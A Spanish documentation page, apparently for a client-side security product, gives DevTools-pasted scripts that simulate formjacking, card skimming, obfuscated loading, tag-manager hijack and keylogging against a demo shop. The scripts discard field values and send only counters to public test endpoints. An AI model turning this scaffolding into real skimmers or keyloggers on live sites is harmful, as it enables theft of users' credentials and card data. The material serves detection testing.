...
description: >-
  Biblioteca de scripts de ataque predefinidos y creación de scripts
  personalizados para pruebas CSD
sidebar:
  order: 9
...
<Aside type="caution">
Estos scripts son **exclusivamente para validación autorizada en preproducción**. Todos los objetivos de exfiltración son endpoints públicos seguros (`www.httpbin.org`, `jsonplaceholder.typicode.com`). Todos los scripts inyectados cargan bibliotecas benignos desde CDNs públicos.
</Aside>
...
- **Formato IIFE** — autoejecutados, pegar y ejecutar en la Consola de DevTools
- **Objetivos de exfiltración seguros** — `www.httpbin.org`, `jsonplaceholder.typicode.com`
...
- **Salida de consola** con prefijo `[CSD Demo]` y una etiqueta de categoría
...
### Recolector de credenciales en página de inicio de sesión
...
(function() {
    ...
    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');

    // Send only synthetic counters; form contents never leave the browser
    var payload = JSON.stringify({
        type: 'login_harvest', field_count: inputs.length,
    ...
    fetch('https://www.httpbin.org/post', {
        ...
        console.log('[CSD Demo][Formjack] Synthetic network signal sent to www.httpbin.org');
    });
...
**Verificar en la consola CSD:**
- **Lista de scripts** — scripts de aplicación (p. ej., `main.js`) marcados como Alto Riesgo por leer los campos de email y contraseña
- **Campos de formulario** — email y contraseña mostrados como Sensibles (por el sistema)
...
(function() {
    ...
    inputs.forEach(function(el) {
        if (el.value) populatedFieldCount++;
    });
    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');

    var payload = JSON.stringify({
        type: 'registration_harvest', field_count: inputs.length,
        populated_field_count: populatedFieldCount,
        field_values_discarded: true, timestamp: Date.now()
    });
    fetch('https://jsonplaceholder.typicode.com/posts', {
        ...
        console.log('[CSD Demo][Formjack] Synthetic network signal sent to jsonplaceholder.typicode.com');
    });
...
**Verificar en la consola CSD:**
- **Campos de formulario** — los campos de registro aparecen con clasificación de sensibilidad
...
### Recolector de tarjetas en página de pago

**Página objetivo:** `/#/login` (el proceso de pago de Juice Shop requiere autenticación — use la página de inicio de sesión para demostrar la técnica de superposición)

**Señales CSD:** Inyección de scripts (formulario superpuesto), lecturas de campos de formulario (campos originales)
...
(function() {
    ...
    console.log('[CSD Demo][Skim] Observed ' + inputs.length + ' fields; values discarded');
    ...
    // Step 3: Send a synthetic network signal without captured data
    var payload = JSON.stringify({
        type: 'card_skim', field_count: inputs.length,
        populated_field_count: populatedFieldCount,
        field_values_discarded: true, timestamp: Date.now()
    });
    fetch('https://www.httpbin.org/post', {
        ...
        console.log('[CSD Demo][Skim] Synthetic network signal sent to www.httpbin.org');
    });
...
**Verificar en la consola CSD:**
- **Lista de scripts** — scripts marcados por manipulación del DOM y lecturas de campos
- **Campos de formulario** — campos originales de la página mostrados con actividad de lectura

### Cargador ofuscado de múltiples etapas

**Página objetivo:** Cualquier página del sitio de demostración

**Señales CSD:** Inyección de scripts (la carga útil decodificada crea una nueva etiqueta de script)
...
**Verificar en la consola CSD:**
- **Lista de scripts** — el script de `cdn.jsdelivr.net` aparece como una nueva entrada
- **Red** — el dominio `cdn.jsdelivr.net` aparece en la lista
...
**Señales CSD:** Inyección de scripts (4 nuevas etiquetas de scripts de terceros), red (4 nuevos dominios)
...
**Verificar en la consola CSD:**
- **Lista de scripts** — 4 nuevas entradas de scripts de `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`
- **Red** — los 4 dominios CDN aparecen en la lista de Todos los dominios

### Simulación de secuestro de gestor de etiquetas

**Página objetivo:** Cualquier página del sitio de demostración

**Señales CSD:** Inyección de scripts (script falso de análisis/gestor de etiquetas)
...
(function() {
    ...
    fakeTag.onload = function() {
        ...
        console.log('[CSD Demo][Supply Chain] Compromised tag observed ' + inputs.length + ' fields; values discarded');
    };
...
**Verificar en la consola CSD:**
- **Lista de scripts** — nuevo script de `cdn.jsdelivr.net` con ruta `chart.js`
...
(function() {
    ...
    // Read form fields for detection, then discard their contents
    var inputs = document.querySelectorAll('input');
    var populatedFieldCount = 0;
    inputs.forEach(function(input) {
        if (input.value) populatedFieldCount++;
    });
    console.log('[CSD Demo][Exfil] Observed ' + inputs.length + ' fields; values discarded');
    var payload = JSON.stringify({
        type: 'multi_channel', field_count: inputs.length,
        populated_field_count: populatedFieldCount,
        field_values_discarded: true, timestamp: Date.now()
    });
...
<Aside type="note">
Los objetivos de exfiltración (`www.httpbin.org`, `jsonplaceholder.typicode.com`) **no** aparecerán en la vista de Red de CSD — solo se muestran los dominios de origen de carga de scripts. La señal de detección principal aquí son las **lecturas de campos de formulario**. Consulte [Límites de detección](/csd/es/overview/#detection-boundaries) para más detalles.
</Aside>

**Verificar en la consola CSD:**
- **Campos de formulario** — los campos de email y contraseña muestran actividad de lectura
- **Lista de scripts** — scripts de aplicación marcados por lecturas de campos

### Exfiltración de alto volumen de dominios

**Página objetivo:** `/#/login` — ingrese credenciales ficticias antes de ejecutar

**Señales CSD:** Lecturas de campos de formulario, inyección de scripts (etiquetas de script de múltiples dominios)
...
(function() {
    ...
    var payload = JSON.stringify({
        type: 'high_volume', field_count: inputs.length,
        populated_field_count: populatedFieldCount,
        field_values_discarded: true, timestamp: Date.now()
    });
...
**Verificar en la consola CSD:**
- **Lista de scripts** — 5 nuevas entradas de scripts de terceros
- **Red** — dominios `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` en la lista
- **Campos de formulario** — los campos de inicio de sesión muestran actividad de lectura
...
(function() {
    ...
    console.log('[CSD Demo][DOM] Observed ' + inputs.length + ' fields; values discarded');
...
<Aside type="note">
CSD **no** rastrea campos de formulario creados dinámicamente. Los elementos `input` inyectados por la superposición no aparecerán en la vista de Campos de formulario de CSD. CSD detecta este ataque a través de las **lecturas de campos originales** que ocurren antes de que se coloque la superposición.
</Aside>

**Verificar en la consola CSD:**
- **Campos de formulario** — los campos originales de email y contraseña muestran actividad de lectura
- **Lista de scripts** — scripts marcados por acceso a campos de formulario

### Simulación de keylogger

**Página objetivo:** `/#/login`

**Señales CSD:** Lecturas de campos de formulario (accede a elementos de entrada para adjuntar listeners)
...
(function() {
    ...
    // Count keydown events without retaining keys or target identity
    document.addEventListener('keydown', function() {
        keystrokeCount++;
        if (keystrokeCount % 10 === 0) {
            console.log('[CSD Demo][DOM] Keydown events observed:', keystrokeCount);
        }
    });
    console.log('[CSD Demo][DOM] Keydown listener attached to document');

    // Access form field values for detection, then discard them
    var inputs = document.querySelectorAll('input');
    inputs.forEach(function(input) {
        void input.value;
    });
    console.log('[CSD Demo][DOM] Monitoring ' + inputs.length + ' fields; values discarded');
    ...
    var interval = setInterval(function() {
        flushCount++;
        if (keystrokeCount > 0) {
            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keystrokeCount, 'events observed');
            fetch('https://www.httpbin.org/post', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    type: 'keylog', keystroke_count: keystrokeCount,
                    key_values_discarded: true, timestamp: Date.now()
                })
            });
            keystrokeCount = 0;
        }
    ...
    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see event counts.');
})();`;

<Code code={keylogger} lang="js" title="Keylogger Simulation" />

**Verificar en la consola CSD:**
- **Campos de formulario** — los campos de entrada muestran actividad de lectura del script de monitoreo
- **Lista de scripts** — scripts marcados por acceder a los valores de los campos de formulario
...
Este script combina todos los vectores de ataque en una sola IIFE — el script de "demostración definitiva". Ejecútelo cuando desee activar todas las señales de detección de CSD en una sola ejecución.

**Página objetivo:** `/#/login` — ingrese credenciales ficticias antes de ejecutar

**Señales CSD:** Lecturas de campos de formulario, inyección de scripts (4 dominios CDN), red (4 nuevos dominios)
...
(function() {
    ...
    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + inputs.length + ' fields observed ' +
...
**Verificar en la consola CSD (después de 5-10 minutos):**
- **Panel** — el contador de Transacciones Consumidas se incrementa
- **Lista de scripts** — scripts de aplicación marcados como Alto Riesgo; 4 nuevos scripts de terceros de dominios CDN
- **Campos de formulario** — email y contraseña clasificados como Sensibles (por el sistema) con actividad de lectura
- **Red** — `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` aparecen en Todos los dominios
- **Usuarios afectados** — su sesión aparece con IP, geolocalización, navegador e información del dispositivo
